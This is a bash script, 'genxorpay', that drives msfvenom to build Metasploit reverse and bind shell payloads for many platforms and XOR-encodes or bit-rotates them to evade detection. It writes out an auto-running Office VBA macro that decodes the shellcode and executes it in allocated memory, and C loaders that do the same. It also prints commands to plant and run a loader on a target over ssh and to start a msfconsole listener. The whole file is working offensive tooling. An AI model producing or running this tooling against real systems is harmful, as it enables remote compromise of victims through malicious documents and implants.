#!/bin/bash
# ==========================
# genxorpay - XOR-Encoded Payload Generator for msfvenom Shellcode
# Supports VBA macros or C shellcode for Linux (.exe or .c)
# ==========================

touch ~/.genxorpay_history
HISTFILE=~/.genxorpay_history
shopt -s histappend  # So history is preserved across sessions
history -r 2>/dev/null  # Load previous history


# ====== CONFIG ======
KEY=0x41
PAYLOAD=""
PAYLOAD_INDEX=""
LHOST=""
LPORT=""
RHOST=""
VBA_OUTPUT=""
RAW_OUTPUT_FILE="raw_shellcode.${FORMAT}"
CLIPCMD=""
INTERACTIVE_MODE=false
ENCODER=""
ITERATIONS=1
ARCH=""
PLATFORM=""
OUTDIR="."
FORCED_FORMAT=""
DEBUG_MODE=false
LOGFILE="debug_output.log"
ROTATE_BITS=0

# ====== PAYLOAD DEFINITIONS ======
declare -A PAYLOADS=(
    [1]="windows/x64/meterpreter/reverse_https"
    [2]="windows/x64/meterpreter/reverse_http"
    [3]="windows/x64/meterpreter/reverse_tcp"
    [4]="windows/meterpreter/reverse_tcp"
    [5]="windows/meterpreter/bind_tcp"
    [6]="windows/shell/reverse_tcp"
    [7]="windows/shell_bind_tcp"
    [8]="windows/shell_reverse_tcp"
    [9]="windows/x64/shell_reverse_tcp"
    [10]="windows/x64/meterpreter_reverse_tcp"
    [11]="linux/x86/meterpreter/reverse_tcp"
    [12]="linux/x64/meterpreter_reverse_tcp"
    [13]="linux/x64/shell_reverse_tcp"
    [14]="osx/x64/shell_reverse_tcp"
    [15]="php/meterpreter_reverse_tcp"
    [16]="python/meterpreter_reverse_tcp"
    [17]="java/meterpreter_reverse_tcp"
    [18]="android/meterpreter_reverse_tcp"
)

declare -A PAYLOAD_OPTIONS=(
    [1]="LHOST,LPORT" [2]="LHOST,LPORT" [3]="LHOST,LPORT"
    [4]="LHOST,LPORT" [5]="RHOST,LPORT" [6]="LHOST,LPORT"
    [7]="RHOST,LPORT" [8]="LHOST,LPORT" [9]="LHOST,LPORT"
    [10]="LHOST,LPORT" [11]="LHOST,LPORT" [12]="LHOST,LPORT"
    [13]="LHOST,LPORT" [14]="LHOST,LPORT" [15]="LHOST,LPORT"
    [16]="LHOST,LPORT" [17]="LHOST,LPORT" [18]="LHOST,LPORT"
)

declare -A PAYLOAD_TYPE=(
    [1]="meterpreter" [2]="meterpreter" [3]="meterpreter"
    [4]="meterpreter" [5]="meterpreter" [6]="shell"
    [7]="shell" [8]="shell" [9]="shell"
    [10]="meterpreter" [11]="meterpreter" [12]="meterpreter"
    [13]="shell" [14]="shell" [15]="meterpreter"
    [16]="meterpreter" [17]="meterpreter" [18]="meterpreter"
)


# Payloads that ONLY support -f elf (can't use 'c' or 'vbapplication' formats)
declare -A ELF_ONLY_PAYLOADS=(
    [11]=1
    [12]=1
)


# ====== ENCODERS ======
declare -A ENCODERS=(
    [1]="x86/shikata_ga_nai"
    [2]="x86/countdown"
    [3]="x86/jmp_call_additive"
    [4]="x86/call4_dword_xor"
    [5]="x86/add_sub"
    [6]="x86/context_stat"
    [7]="x86/context_time"
    [8]="x86/fnstenv_mov"
    [9]="x64/xor"
    [10]="cmd/powershell_base64"
    [11]="x64/zutto_dekiru"
)


# ====== FUNCTIONS ======
show_payloads() {
    echo "Available Payloads:"
    for i in $(printf "%s\n" "${!PAYLOADS[@]}" | sort -n); do
        echo "  $i) ${PAYLOADS[$i]}"
    done
}

show_encoders() {
    echo "Available Encoders:"
    for i in $(printf "%s\n" "${!ENCODERS[@]}" | sort -n); do
        echo "  $i) ${ENCODERS[$i]}"
    done
}

rotate_left() {
    local byte=$1
    local bits=$2
    echo $(( ((byte << bits) | (byte >> (8 - bits))) & 0xFF ))
}

# ====== ARGUMENT PARSING ======
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -lhost) LHOST="$2"; shift 2 ;;
        -lport) LPORT="$2"; shift 2 ;;
        -rhost) RHOST="$2"; shift 2 ;;
        -p) PAYLOAD_INDEX="$2"; PAYLOAD="${PAYLOADS[$2]}"; shift 2 ;;
        -key) KEY="$2"; shift 2 ;;
        -o) VBA_OUTPUT="$2"; shift 2 ;;
        -raw) RAW_OUTPUT_FILE="$2"; shift 2 ;;
        -e|--encoder)
            if [[ "$2" =~ ^[0-9]+$ ]]; then
                # User passed index
                ENCODER="${ENCODERS[$2]}"
                if [[ -z "$ENCODER" ]]; then
                    echo "[-] Invalid encoder index: $2"
                    exit 1
                fi
                echo "[*] Encoder selected (index $2): $ENCODER"
            else
                ENCODER="$2"
                echo "[*] Encoder selected (name): $ENCODER"
            fi

            # === Validate encoder compatibility with architecture ===
            if [[ -n "$ENCODER" && -n "$ARCH" ]]; then
                if [[ "$ARCH" == "x64" && "$ENCODER" =~ ^x86/ ]]; then
                    echo "[-] Selected encoder '$ENCODER' is for x86, but you specified --arch x64."
                    echo "    Try using an x64-compatible encoder like: ${ENCODERS[9]}"
                    exit 1
                elif [[ "$ARCH" == "x86" && "$ENCODER" =~ ^x64/ ]]; then
                    echo "[-] Selected encoder '$ENCODER' is for x64, but you specified --arch x86."
                    exit 1
                fi
            fi

            shift 2 ;;
        --iterations) ITERATIONS="$2"; shift 2 ;;
        --arch) ARCH="$2"; shift 2 ;;
        --platform) PLATFORM="$2"; shift 2 ;;
        --format) FORCED_FORMAT="$2"; shift 2 ;;
        --outdir) OUTDIR="$2"; shift 2 ;;
        --rotate)
            ROTATE_BITS="$2"
            [[ "$ROTATE_BITS" =~ ^[0-9]+$ ]] || { echo "[-] Invalid rotate value: $2"; exit 1; }
            echo "[*] Bit rotation enabled: $ROTATE_BITS bits"
            shift 2
            ;;
        -i|--interactive) INTERACTIVE_MODE=true; shift ;;
        --debug) DEBUG_MODE=true; shift ;;
        -h|--help)
            echo "Usage: $0 -p <index> -lhost <IP> -lport <PORT> [options]"
            echo ""
            echo "===== BASIC OPTIONS ====="
            echo "  -p <index>           Payload index (see list below)"
            echo "  -lhost <IP>          Local host IP"
            echo "  -lport <PORT>        Local port"
            echo "  -rhost <IP>          Remote host (for bind payloads)"
            echo "  -key <0xNN>          XOR key (default: 0x41)"
            echo "  -o <vba.vba>         Output VBA macro file"
            echo "  -raw <raw.vba>       Save raw shellcode"
            echo "  -i                   Enable interactive clipboard menu"
            echo ""
            echo "===== ADVANCED OPTIONS ====="
            echo "  -e <encoder>         Use msfvenom encoder (e.g. x86/shikata_ga_nai)"
            echo "  --iterations <N>     Number of encoder iterations"
            echo "  --arch <x86|x64>     Architecture override"
            echo "  --platform <win|linux|osx>  Platform override"
            echo "  --format <exe|vbapplication|c>  Output format"
            echo "  --outdir <dir>       Output directory"
            echo "  --debug              Print full msfvenom command and output"
            echo "  --nosuggest          Ommits suggested compilation string"
            echo ""
            echo "===== PAYLOAD LIST ====="
            show_payloads
            echo "===== ENCODERS LIST ====="
            show_encoders
            exit 0 ;;
        *) echo "[-] Unknown option: $1"; exit 1 ;;
    esac
done

#  Ensure Only Either Rotate bits or Xor is used at a single time, until feature implemented in the future
if [[ "$KEY" != "0x41" && "$ROTATE_BITS" -ne 0 ]]; then
    echo "[-] Cannot use both XOR and rotate simultaneously. Use one or the other."
    exit 1
fi


# Prompt if payload not set
[[ -z "$PAYLOAD" ]] && { show_payloads; read -p "Select payload index: " PAYLOAD_INDEX; PAYLOAD="${PAYLOADS[$PAYLOAD_INDEX]}"; }



# === Validate ARCH compatibility if specified ===
if [[ -n "$ARCH" ]]; then
    case "$PAYLOAD" in
        *x64*) PAYLOAD_ARCH="x64" ;;
        *x86*) PAYLOAD_ARCH="x86" ;;
        *x86/*|*/x86/*) PAYLOAD_ARCH="x86" ;;
        *x64/*|*/x64/*) PAYLOAD_ARCH="x64" ;;
        *arm64*) PAYLOAD_ARCH="arm64" ;;
        *arm*) PAYLOAD_ARCH="arm" ;;
        *meterpreter/reverse_tcp|*shell/reverse_tcp|*shell_bind_tcp|*meterpreter/bind_tcp)
            PAYLOAD_ARCH="x86" ;;  # Metasploit defaults
        *)
            PAYLOAD_ARCH="unknown"
            echo "[!] Warning: Unknown architecture for selected payload."
            ;;
    esac

    if [[ "$PAYLOAD_ARCH" != "unknown" && "$ARCH" != "$PAYLOAD_ARCH" ]]; then
        echo "[-] Architecture mismatch:"
        echo "    Payload: ${PAYLOAD} (implies '$PAYLOAD_ARCH')"
        echo "    You specified --arch '$ARCH'"
        echo "    Please correct the --arch argument or choose another payload."
        exit 1
    fi
fi

# === Validate PLATFORM compatibility if specified ===
if [[ -n "$PLATFORM" ]]; then
    case "$PAYLOAD" in
        windows/*) PAYLOAD_PLATFORM="windows" ;;
        linux/*)   PAYLOAD_PLATFORM="linux" ;;
        osx/*)     PAYLOAD_PLATFORM="osx" ;;
        php/*)     PAYLOAD_PLATFORM="php" ;;
        python/*)  PAYLOAD_PLATFORM="python" ;;
        java/*)    PAYLOAD_PLATFORM="java" ;;
        android/*) PAYLOAD_PLATFORM="android" ;;
        *)         PAYLOAD_PLATFORM="unknown" ;;
    esac

    if [[ "$PAYLOAD_PLATFORM" != "unknown" && "$PLATFORM" != "$PAYLOAD_PLATFORM" ]]; then
        echo "[-] Platform mismatch:"
        echo "    Payload suggests platform '$PAYLOAD_PLATFORM'"
        echo "    You specified --platform '$PLATFORM'"
        echo "    Please correct or remove the --platform flag."
        exit 1
    fi
fi


# Validate required inputs
IFS=',' read -ra OPT_ARRAY <<< "${PAYLOAD_OPTIONS[$PAYLOAD_INDEX]}"
for opt in "${OPT_ARRAY[@]}"; do
    val=$(eval echo \$$opt)
    [[ -z "$val" ]] && read -p "Enter value for $opt: " val && eval "$opt=\"$val\""
done

# === Check for msfvenom ===
command -v msfvenom >/dev/null || { echo "[-] msfvenom not found"; exit 1; }

# === Determine Output Format ===
if [[ -n "$FORCED_FORMAT" ]]; then
    FORMAT="$FORCED_FORMAT"

    VALID_FORMATS=("exe" "vbapplication" "c" "elf")
    if [[ ! " ${VALID_FORMATS[*]} " =~ " $FORMAT " ]]; then
        echo "[-] Invalid format specified: '$FORMAT'"
        echo "    Valid formats: ${VALID_FORMATS[*]}"
        exit 1
    fi
else
    case "$PAYLOAD" in
        windows/*|php/*|java/*) FORMAT="vbapplication" ;;
        linux/*) FORMAT="c" ;;
        *) FORMAT="exe" ;;
    esac
fi

# === Restrict ELF-only payloads ===
if [[ -n "${ELF_ONLY_PAYLOADS[$PAYLOAD_INDEX]}" ]]; then
    if [[ "$FORMAT" != "exe" && "$FORMAT" != "elf" ]]; then
        echo "[-] Payload '${PAYLOADS[$PAYLOAD_INDEX]}' only supports ELF/exe output."
        echo "    You selected format '$FORMAT', which is not compatible."
        echo "    Please use: --format exe (or elf if supported) or choose a different payload."
        exit 1
    fi
fi

# Prompt for encoder
# === Prompt for encoder ONLY IF applicable ===
# Normalize and calculate XOR key
KEY_DEC=$((KEY))

if [[ -z "$ENCODER" ]]; then
    if [[ "$PLATFORM" == "linux" && "$FORMAT" == "c" && ( "$KEY_DEC" -ne 0 || "$ROTATE_BITS" -ne 0 ) ]]; then
        echo "[*] Skipping encoder prompt: custom encoding (XOR/rotate) applied to Linux shellcode payload."
    else
        read -p "Would you like to use an encoder? (y/n): " enc_choice
        if [[ "$enc_choice" =~ ^[Yy]$ ]]; then
            show_encoders
            read -p "Select encoder index: " ENCODER_INDEX
            ENCODER="${ENCODERS[$ENCODER_INDEX]}"
            if [[ -z "$ENCODER" ]]; then
                echo "[-] Invalid encoder index"
                exit 1
            fi
            read -p "Iterations (default: 1): " USER_ITER
            [[ -n "$USER_ITER" ]] && ITERATIONS="$USER_ITER"
        fi
    fi
fi




# === Clipboard Command ===
if command -v xclip &>/dev/null; then
    CLIPCMD="xclip -selection clipboard"
elif command -v xsel &>/dev/null; then
    CLIPCMD="xsel --clipboard --input"
elif command -v pbcopy &>/dev/null; then
    CLIPCMD="pbcopy"
elif command -v wl-copy &>/dev/null; then
    CLIPCMD="wl-copy"
elif command -v clip.exe &>/dev/null; then
    CLIPCMD="clip.exe"
elif [[ -x /mnt/c/Windows/System32/clip.exe ]]; then
    CLIPCMD="/mnt/c/Windows/System32/clip.exe"
else
    echo "[!] No supported clipboard tool found. Output will be printed instead." | tee -a "$LOGFILE"
    CLIPCMD="cat"
fi

# === Build msfvenom command ===
VENOM_ARGS=""
for opt in "${OPT_ARRAY[@]}"; do
    val=$(eval echo \$$opt)
    VENOM_ARGS+="$opt=$val "
done
[[ -n "$ENCODER" ]] && VENOM_ARGS+="-e $ENCODER -i $ITERATIONS "
[[ -n "$ARCH" ]] && VENOM_ARGS+="--arch $ARCH "
[[ -n "$PLATFORM" ]] && VENOM_ARGS+="--platform $PLATFORM "

# === File name ===
mkdir -p "$OUTDIR"
if [[ -n "$VBA_OUTPUT" ]]; then
    OUTFILE="$OUTDIR/$(basename "$VBA_OUTPUT")"
else
    BASE_NAME="${PAYLOAD//\//_}"
    OUTFILE="$OUTDIR/$BASE_NAME.$FORMAT"
fi

KEY_DEC=$((KEY))
KEY_HEX=$(printf "0x%02X" "$KEY_DEC")

# === Generate payload ===
echo "[*] Generating payload: $PAYLOAD"
case "$FORMAT" in
    exe)
        msfvenom -p "$PAYLOAD" $VENOM_ARGS -f exe -o "$OUTFILE" || { echo "[-] msfvenom failed"; exit 1; }
        echo "[+] Saved: $OUTFILE"
        exit 0 ;;
    vbapplication)
        if [[ "$PAYLOAD" == windows/* ]]; then
            raw=$(msfvenom -p "$PAYLOAD" $VENOM_ARGS EXITFUNC=thread -f vbapplication 2>/dev/null)
        else
            raw=$(msfvenom -p "$PAYLOAD" $VENOM_ARGS -f vbapplication 2>/dev/null)
        fi
        echo "$raw" > "$OUTDIR/$RAW_OUTPUT_FILE" ;;
    c)
      raw=$(msfvenom -p "$PAYLOAD" $VENOM_ARGS -f c) 
      echo "$raw" > "$OUTDIR/$RAW_OUTPUT_FILE" ;;
    elf)
        msfvenom -p "$PAYLOAD" $VENOM_ARGS -f elf -o "$OUTFILE" || { echo "[-] msfvenom failed"; exit 1; }
        echo "[+] Saved: $OUTFILE"
        exit 0 ;;
    *)
        echo "[-] Unknown format: $FORMAT"
        exit 1 ;;
esac

encoded_array=()

# === Extract and XOR encode ===
if [[ "$FORMAT" == "vbapplication" ]]; then
    array=$(sed -n '/Array(/,/)/p' <<< "$raw" | tr -d '\r\n\t ' | sed -e 's/_//g' -e 's/^.*Array(//' -e 's/).*//')
    clean_array=$(echo "$array" | tr -d '[:space:]' | sed 's/,,*/,/g' | sed 's/^,//;s/,$//')
    IFS=',' read -ra bytes <<< "$clean_array"

    encoded_array=()
    for b in "${bytes[@]}"; do
        if [[ "$b" =~ ^[0-9]+$ ]]; then
            encoded_array+=($(( b ^ KEY_DEC )))
        fi
    done

    encoded_csv=$(IFS=,; echo "${encoded_array[*]}")

    # Set vba_key
    if [[ "$KEY" =~ ^0x ]]; then
        vba_key="&H$(printf "%X" $((KEY)))"
    else
        vba_key="$KEY"
    fi
else
    # Extract all \x?? hex bytes from the C shellcode output
    shellcode=$(echo "$raw" | grep -o '\\x[0-9a-fA-F]\{2\}')

    encoded=""
    encoded_array=()
    for byte in $shellcode; do
        hex="${byte:2}"
        dec_val=$((16#$hex))
        
        if [[ "$ROTATE_BITS" -gt 0 ]]; then
            rot_val=$(rotate_left "$dec_val" "$ROTATE_BITS")
            encoded+="\\x$(printf "%02X" "$rot_val")"
            encoded_array+=($rot_val)
        elif [[ "$KEY_DEC" -ne 0 ]]; then
            xor_val=$(( dec_val ^ KEY_DEC ))
            encoded+="\\x$(printf "%02X" "$xor_val")"
            encoded_array+=($xor_val)
        else
            encoded+="\\x$hex"
            encoded_array+=($dec_val)
        fi
    done

    # For clipboard menu
    encoded_csv=$(IFS=,; echo "${encoded_array[*]}")
fi


# === Generate output ===
if [[ "$FORMAT" == "vbapplication" && -n "$VBA_OUTPUT" ]]; then
    echo "[*] Generating VBA macro: $VBA_OUTPUT"
    {
        echo "Private Declare PtrSafe Function CreateThread Lib \"KERNEL32\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr"
        echo "Private Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr"
        echo "Private Declare PtrSafe Function RtlMoveMemory Lib \"KERNEL32\" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr"
        echo ""
        echo "Function MyMacro()"
        echo "    Dim addr As LongPtr"
        echo "    Dim counter As Long"
        echo "    Dim decodedByte As Byte"
        echo "    Dim key As Byte: key = $vba_key"
        echo -n "    sc = Array("
        for ((i = 0; i < ${#encoded_array[@]}; i++)); do
            printf "%s" "${encoded_array[$i]}"
            (( i < ${#encoded_array[@]} - 1 )) && printf ","
            (( (i + 1) % 80 == 0 )) && echo " _" && echo -n "        "
            (( i < ${#encoded_array[@]} - 1 )) && printf " "
        done
        echo ")"
        echo "    addr = VirtualAlloc(0, UBound(sc), &H3000, &H40)"
        echo "    For counter = LBound(sc) To UBound(sc)"
        echo "        decodedByte = sc(counter) Xor key"
        echo "        RtlMoveMemory addr + counter, decodedByte, 1"
        echo "    Next counter"
        echo "    CreateThread 0, 0, addr, 0, 0, 0"
        echo "End Function"
        echo "Sub Document_Open(): MyMacro: End Sub"
        echo "Sub AutoOpen(): MyMacro: End Sub"
    } > "$VBA_OUTPUT"
    echo "[+] VBA macro saved to $VBA_OUTPUT"
elif [[ "$FORMAT" == "c" ]]; then
    # Determine C output file name
    if [[ -n "$VBA_OUTPUT" ]]; then
        # Remove any extension and append `.c`
        base_name_no_ext="${VBA_OUTPUT%.*}"
        CFILE="$OUTDIR/$(basename "$base_name_no_ext").c"
    else
        CFILE="$OUTDIR/decode_payload.c"
    fi

    C_OUTPUT_FILE="$CFILE"

    if [[ "$ROTATE_BITS" -gt 0 ]]; then
        cat > "$CFILE" <<EOF
#include <stdio.h>
#include <stdint.h>

// Rotated buffer (left during encoding)
unsigned char buf[] = "$encoded";

// Rotate Right (to decode)
unsigned char ror(unsigned char byte, int count) {
    return ((byte >> count) | (byte << (8 - count))) & 0xFF;
}

int main() {
    for (int i = 0; i < sizeof(buf) - 1; i++) {
        buf[i] = ror(buf[i], $ROTATE_BITS);
    }

    int (*ret)() = (int(*)())buf;
    ret();
}
EOF

    elif [[ "$KEY_DEC" -ne 0 ]]; then
        cat > "$CFILE" <<EOF
#include <stdio.h>

unsigned char buf[] = "$encoded";

int main() {
    char key = $KEY_DEC;
    for (int i = 0; i < sizeof(buf) - 1; i++) {
        buf[i] ^= key;
    }

    int (*ret)() = (int(*)())buf;
    ret();
}
EOF

    else
        # No XOR or rotation applied
        cat > "$CFILE" <<EOF
#include <stdio.h>

unsigned char buf[] = "$encoded";

int main() {
    int (*ret)() = (int(*)())buf;
    ret();
}
EOF
    fi

    echo "[+] C payload saved to $CFILE"

    [[ "$NO_SUGGEST" != true ]] && {
        echo "[*] Suggested Compilation:"
        echo ""
        echo "    gcc $(basename "$CFILE") -o decode.out -z execstack"
        echo ""
        echo "[*] Suggested Remote Execution (example):"
        echo "    scp \"$CFILE\" <user>@<target-ip>:/tmp/"
        echo "    ssh <user>@<target-ip> 'gcc /tmp/$(basename "$CFILE") -o /tmp/decode.out -z execstack && nohup /tmp/decode.out >/dev/null 2>&1 &'"
        echo ""
    }

    C_OUTPUT_FILE="$CFILE"
fi


# === Listener command ===
MSF_COMMAND="msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD $PAYLOAD; "
for opt in "${OPT_ARRAY[@]}"; do
    val=$(eval echo \$$opt)
    MSF_COMMAND+="set $opt $val; "
done

# Append EXITFUNC only for Windows payloads
if [[ "$PAYLOAD" == windows/* ]]; then
    MSF_COMMAND+="set EXITFUNC thread; "
fi

MSF_COMMAND+="run\""

echo "[*] Listener: $MSF_COMMAND"


# === Dynamic Interactive Menu Function ===
interactive_menu() {
    while true; do
        echo -e "\n[*] Interactive Menu:"

        options=()
        opt_num=1

        if [[ "$FORMAT" == "vbapplication" && -f "$VBA_OUTPUT" ]]; then
            echo "$opt_num) Copy VBA macro"
            options+=("vba")
            ((opt_num++))
        fi

        if [[ "$FORMAT" == "c" && -f "$C_OUTPUT_FILE" ]]; then
            echo "$opt_num) Copy C Payload Code"
            options+=("c")
            ((opt_num++))
        fi

        if [[ -f "$OUTDIR/$RAW_OUTPUT_FILE" ]]; then
            echo "$opt_num) Copy raw shellcode"
            options+=("raw")
            ((opt_num++))
        fi

        if [[ "$FORMAT" == "vbapplication" || "$FORMAT" == "c" ]]; then
            if [[ "$ROTATE_BITS" -gt 0 ]]; then
                echo "$opt_num) Copy Rotated Bytes"
                options+=("rotated")
            else
                echo "$opt_num) Copy XOR Bytes"
                options+=("xor")
            fi
            ((opt_num++))
        fi

        echo "$opt_num) Copy MSF command"
        options+=("msf")
        ((opt_num++))

        echo "$opt_num) Copy all"
        options+=("all")
        ((opt_num++))

        echo -e "\nq) Quit"

        read -e -p "GenXorPay> " opt
        history -s "$opt"
        history -a  # Append to history file


        if [[ "$opt" =~ ^[Qq]$ ]]; then
            break
        elif [[ "$opt" =~ ^[0-9]+$ && $((opt - 1)) -lt ${#options[@]} ]]; then
            selected="${options[$((opt - 1))]}"
            case "$selected" in
                vba)
                    if [[ -f "$VBA_OUTPUT" ]]; then
                        cat "$VBA_OUTPUT" | $CLIPCMD
                        echo "[+] VBA macro copied." | tee -a "$LOGFILE"
                    else
                        echo "[-] VBA macro file not found."
                    fi
                    ;;
                c)
                    if [[ -f "$C_OUTPUT_FILE" ]]; then
                        cat "$C_OUTPUT_FILE" | $CLIPCMD
                        echo "[+] C payload code copied." | tee -a "$LOGFILE"
                    else
                        echo "[-] C Payload file not found."
                    fi
                    ;;

                raw)
                    if [[ -f "$OUTDIR/$RAW_OUTPUT_FILE" ]]; then
                        cat "$OUTDIR/$RAW_OUTPUT_FILE" | $CLIPCMD
                        echo "[+] Raw shellcode copied." | tee -a "$LOGFILE"
                    else
                        echo "[-] Raw shellcode file not found."
                    fi
                    ;;
                xor)
                    if [[ -n "$encoded_csv" ]]; then
                        echo "$encoded_csv" | $CLIPCMD
                        echo "[+] XOR-encoded shellcode copied." | tee -a "$LOGFILE"
                    else
                        echo "[-] XOR-encoded data missing."
                    fi
                    ;;
                rotated)
                       echo "$encoded_csv" | $CLIPCMD
                       echo "[+] Rotated shellcode copied." | tee -a "$LOGFILE"
                       ;;
                msf)
                    echo "$MSF_COMMAND" | $CLIPCMD
                    echo "[+] msfconsole command copied." | tee -a "$LOGFILE"
                    ;;
                all)
                    {
                        if [[ "$FORMAT" == "vbapplication" && -f "$VBA_OUTPUT" ]]; then
                            echo "===== VBA Macro ====="
                            cat "$VBA_OUTPUT"
                            echo ""
                        fi

                        if [[ "$FORMAT" == "c" && -f "$C_OUTPUT_FILE" ]]; then
                            echo "===== C Payload Code ====="
                            cat "$C_OUTPUT_FILE"
                            echo ""
                        fi

                        if [[ -f "$OUTDIR/$RAW_OUTPUT_FILE" ]]; then
                            echo "===== Raw Shellcode ====="
                            cat "$OUTDIR/$RAW_OUTPUT_FILE"
                            echo ""
                        fi

                        if [[ "$FORMAT" == "vbapplication" || "$FORMAT" == "c" ]]; then
                            echo "===== XOR Bytes ====="
                            echo "$encoded_csv"
                            echo ""
                        fi

                        echo "===== Listener ====="
                        echo "$MSF_COMMAND"
                    } | $CLIPCMD

                    echo "[+] All data copied." | tee -a "$LOGFILE"
                    ;;

            esac
        else
            echo "[-] Invalid selection."
        fi
    done
}

# === Call Interactive Menu if Enabled ===
if [[ "$INTERACTIVE_MODE" == true ]]; then
    interactive_menu
fi
